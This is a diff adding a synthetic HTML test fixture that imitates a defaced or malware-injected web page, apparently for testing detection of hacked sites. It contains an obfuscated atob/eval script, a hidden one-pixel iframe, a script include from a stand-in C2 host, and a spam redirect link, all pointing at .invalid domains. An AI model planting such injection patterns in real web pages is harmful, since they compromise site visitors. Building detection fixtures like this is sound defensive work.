@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>Hacked fixture (synthetic)</title>
+</head>
+<body>
+<h1>Hacked page fixture (synthetic, loopback only)</h1>
+<p>This page simulates common defacement / malware-injection markers.
+All identifiers are synthetic; every domain is in the unresolvable
+<code>.invalid</code> TLD so nothing here contacts the network.</p>
+
+<!-- Marker 1: obfuscated inline script using atob/eval, common in injected payloads -->
+<script>
+  var _0x_payload = ["aGVsbG8td29ybGQ="];
+  function _0x_decode(s) { return atob(s); }
+  document.write('<iframe src="http://ads.example.invalid/frame" width="1" height="1"></iframe>');
+  eval(_0x_decode(_0x_payload[0]));
+</script>
+
+<!-- Marker 2: external script loaded from a suspicious C2-like host -->
+<script src="http://c2.example.invalid/evil.js"></script>
+
+<!-- Marker 3: typical SEO-spam / redirect snippet -->
+<a href="http://spam.example.invalid/casino">click here</a>
+</body>
+</html>
